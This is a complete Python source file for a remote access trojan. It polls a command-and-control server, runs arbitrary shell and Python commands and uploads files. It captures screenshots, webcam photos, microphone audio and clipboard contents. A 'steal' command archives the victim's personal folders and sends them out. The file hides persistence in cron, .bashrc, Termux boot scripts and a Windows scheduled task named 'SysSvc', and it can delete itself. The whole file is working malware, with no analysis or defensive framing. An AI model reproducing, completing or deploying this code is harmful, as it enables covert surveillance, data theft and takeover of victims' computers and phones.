#!/usr/bin/env python3
import os, sys, json, time, base64, subprocess, threading, platform
import tempfile, random, secrets, tarfile, shutil
import urllib.request

BASE = "__BASE__"; TOKEN = "__TOKEN__"; NAME = "__NAME__"
POLL = 1.0; CH = 512 * 1024
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
SIDF = os.path.join(tempfile.gettempdir(), ".sid")

def _sid():
    try:
        s = open(SIDF).read().strip()
        if len(s) == 16: return s
    except Exception: pass
    s = secrets.token_hex(8)
    try: open(SIDF, "w").write(s)
    except Exception: pass
    return s

SID = _sid()

def http(path, data=None, timeout=40):
    r = urllib.request.Request(BASE + path, data=data, headers=UA)
    with urllib.request.urlopen(r, timeout=timeout) as f: return f.read()

def post(o, timeout=40):
    try: http("/r/" + SID, json.dumps(o).encode(), timeout)
    except Exception: pass

def out(rid, txt): post({"t": "out", "id": rid, "d": txt})
def which(b): return shutil.which(b)

def sh(c, t=90):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e: return "ERR %s" % e

def info():
    d = {"host": platform.node(), "os": platform.platform(), "arch": platform.machine(),
         "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
         "cwd": os.getcwd(), "pid": os.getpid(), "python": sys.version.split()[0],
         "termux": os.environ.get("PREFIX", "").startswith("/data/data/com.termux")}
    try:
        s = __import__("socket").socket(2, 2); s.connect(("8.8.8.8", 80))
        d["ip"] = s.getsockname()[0]; s.close()
    except Exception: d["ip"] = "?"
    return d

def screen():
    p = os.path.join(tempfile.gettempdir(), "s_%d.png" % time.time())
    for t in (["screencap","-p",p],["scrot","-z",p],["import","-window","root",p],
              ["gnome-screenshot","-f",p],["spectacle","-b","-n","-o",p],["screencapture","-x",p]):
        if which(t[0]):
            subprocess.run(t, capture_output=True, timeout=40)
            if os.path.exists(p) and os.path.getsize(p) > 0: return p
    if os.name == "nt":
        ps = ("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
              "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
              "$i=New-Object Drawing.Bitmap $b.Width,$b.Height;"
              "$g=[Drawing.Graphics]::FromImage($i);"
              "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
              "$i.Save('%s')" % p.replace("\\","\\\\"))
        subprocess.run(["powershell","-NoProfile","-Command",ps], capture_output=True, timeout=60)
        if os.path.exists(p): return p
    return None

def cam():
    p = os.path.join(tempfile.gettempdir(), "c_%d.jpg" % time.time())
    for t in (["termux-camera-photo","-c","0",p],["fswebcam","-q","--no-banner",p],
              ["ffmpeg","-y","-f","v4l2","-i","/dev/video0","-frames:v","1",p],["imagesnap","-q",p]):
        if which(t[0]):
            subprocess.run(t, capture_output=True, timeout=40)
            if os.path.exists(p) and os.path.getsize(p) > 0: return p
    return None

def send_file(rid, path):
    try: size = os.path.getsize(path)
    except Exception as e:
        out(rid, "ERR %s\n" % e); return
    fid = secrets.token_hex(6); name = os.path.basename(path)
    out(rid, "[file] %s (%d b)\n" % (name, size))
    with open(path, "rb") as f:
        i = 0
        while True:
            b = f.read(CH)
            if not b: break
            post({"t":"file","id":rid,"fid":fid,"name":name,"i":i,
                  "d":base64.b64encode(b).decode(),"last":False})
            i += 1
    post({"t":"file","id":rid,"fid":fid,"name":name,"i":i,"last":True,"size":size})

def persist():
    home = os.path.expanduser("~"); cmd = "%s %s" % (sys.executable, os.path.abspath(__file__))
    r = []
    if os.path.isdir(os.path.join(home, ".termux")):
        b = os.path.join(home, ".termux", "boot"); os.makedirs(b, exist_ok=True)
        p = os.path.join(b, "svc.sh")
        open(p,"w").write("#!/data/data/com.termux/files/usr/bin/sh\ntermux-wake-lock\nnohup %s >/dev/null 2>&1 &\n" % cmd)
        os.chmod(p, 0o755); r.append("termux-boot")
    if which("crontab"):
        c = sh("crontab -l 2>/dev/null"); l = "@reboot nohup %s >/dev/null 2>&1 &" % cmd
        if l not in c:
            open("/tmp/_c","w").write(c + l + "\n"); sh("crontab /tmp/_c"); r.append("cron")
    rc = os.path.join(home, ".bashrc")
    if os.path.exists(rc) and "svc.sh" not in open(rc).read():
        open(rc,"a").write("\n(pgrep -f '%s' >/dev/null || nohup %s >/dev/null 2>&1 &)\n"
                           % (os.path.basename(__file__), cmd)); r.append("bashrc")
    if os.name == "nt":
        sh('schtasks /create /tn SysSvc /tr "\\"%s\\" \\"%s\\"" /sc onlogon /f' % (sys.executable, os.path.abspath(__file__)))
        r.append("schtasks")
    return ", ".join(r) or "none"

def unpersist():
    home = os.path.expanduser("~"); r = []
    p = os.path.join(home, ".termux", "boot", "svc.sh")
    if os.path.exists(p): os.remove(p); r.append("boot")
    if which("crontab"):
        c = [x for x in sh("crontab -l 2>/dev/null").splitlines() if "svc.sh" not in x and "__RAT__" not in x]
        open("/tmp/_c","w").write("\n".join(c) + "\n"); sh("crontab /tmp/_c"); r.append("cron")
    if os.name == "nt": sh('schtasks /delete /tn SysSvc /f'); r.append("schtasks")
    return ", ".join(r) or "none"

UPS = {}

def handle(m):
    t = m.get("t"); rid = m.get("id"); a = m.get("a") or ""

    if t == "shell":
        p = subprocess.Popen(a, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             stdin=subprocess.DEVNULL, cwd=os.getcwd())
        for ln in iter(p.stdout.readline, b""):
            out(rid, ln.decode(errors="replace"))
        p.wait(); out(rid, "\n[rc=%d]\n" % p.returncode)

    elif t == "py":
        b = {}
        try:
            exec(compile(a, "<r>", "exec"), b); out(rid, str(b.get("r","")) + "\n")
        except Exception:
            import traceback; out(rid, traceback.format_exc())

    elif t == "cd":
        try: os.chdir(os.path.expanduser(a)); out(rid, os.getcwd() + "\n")
        except Exception as e: out(rid, "ERR %s\n" % e)

    elif t == "pwd": out(rid, os.getcwd() + "\n")

    elif t == "ls":
        tg = a or "."
        out(rid, sh('dir "%s"' % tg) if os.name == "nt" else
            sh("ls -la --color=never '%s'" % tg.replace("'", "'\\''")))

    elif t == "get": send_file(rid, os.path.expanduser(a))

    elif t == "grab":
        src = os.path.expanduser(a or ".")
        tmp = os.path.join(tempfile.gettempdir(), "g_%d.tar.gz" % time.time())
        try:
            with tarfile.open(tmp, "w:gz") as tf: tf.add(src, arcname=os.path.basename(os.path.abspath(src)))
            send_file(rid, tmp); os.remove(tmp)
        except Exception as e: out(rid, "ERR %s\n" % e)

    elif t == "steal":
        home = os.path.expanduser("~")
        names = ["Desktop","Documents","Downloads","Pictures","DCIM","Movies","Music"]
        tmp = os.path.join(tempfile.gettempdir(), "st_%d.tar.gz" % time.time())
        try:
            with tarfile.open(tmp, "w:gz") as tf:
                for n in names:
                    p = os.path.join(home, n)
                    if os.path.isdir(p):
                        try: tf.add(p, arcname=n)
                        except Exception: pass
            send_file(rid, tmp); os.remove(tmp)
        except Exception as e: out(rid, "ERR %s\n" % e)

    elif t == "info": out(rid, json.dumps(info(), indent=2) + "\n")
    elif t == "ps": out(rid, sh("ps aux" if os.name != "nt" else "tasklist"))

    elif t == "shot":
        f = screen()
        if f: send_file(rid, f)
        else: out(rid, "no screenshot backend\n")

    elif t == "cam":
        f = cam()
        if f: send_file(rid, f)
        else: out(rid, "no camera backend\n")

    elif t == "clip":
        if m.get("op") == "set":
            if which("termux-clipboard-set"): sh("termux-clipboard-set '%s'" % a.replace("'", ""))
            elif which("xclip"): sh("echo '%s'|xclip -sel c" % a)
            elif which("pbcopy"): sh("echo '%s'|pbcopy" % a)
            out(rid, "ok\n")
        else:
            r = ""
            if which("termux-clipboard-get"): r = sh("termux-clipboard-get")
            elif which("pbpaste"): r = sh("pbpaste")
            elif which("xclip"): r = sh("xclip -o -sel c")
            out(rid, r + "\n")

    elif t == "toast": sh("termux-toast '%s'" % a); out(rid, "ok\n")
    elif t == "vibrate": sh("termux-vibrate -d %s" % (a or "800")); out(rid, "ok\n")

    elif t == "audio":
        n = int(a or 6); f = os.path.join(tempfile.gettempdir(), "a_%d.m4a" % time.time())
        sh("termux-microphone-record -d %d -f '%s'" % (n, f)); time.sleep(n + 1)
        if os.path.exists(f): send_file(rid, f)
        else: out(rid, "no audio backend\n")

    elif t == "persist": out(rid, persist() + "\n")
    elif t == "unpersist": out(rid, unpersist() + "\n")

    elif t == "put_begin": UPS[m["fid"]] = {"n": m["name"], "b": []}
    elif t == "put_chunk": UPS[m["fid"]]["b"].append(base64.b64decode(m["d"]))
    elif t == "put_end":
        e = UPS.pop(m["fid"], None)
        if e:
            d = os.path.join(os.getcwd(), e["n"]); open(d, "wb").write(b"".join(e["b"]))
            out(rid, "saved %s (%d b)\n" % (d, os.path.getsize(d)))

    elif t == "sd":
        try: unpersist()
        except Exception: pass
        out(rid, "bye\n"); time.sleep(1)
        try: os.remove(os.path.abspath(__file__))
        except Exception: pass
        os._exit(0)

    elif t == "kill": out(rid, "bye\n"); time.sleep(1); os._exit(0)

def main():
    back = 2
    while True:
        try:
            post({"t":"hello","info":info()}); break
        except Exception:
            time.sleep(back); back = min(back * 2, 60)

    while True:
        try:
            raw = http("/p/" + SID, timeout=45)
            cmds = json.loads(raw).get("c", [])
            back = 2
        except Exception:
            time.sleep(back); back = min(back * 2, 60); continue
        for c in cmds:
            try: handle(c)
            except Exception as e: out(c.get("id"), "ERR %s\n" % e)
        time.sleep(POLL + random.random())

if __name__ == "__main__":
    main()
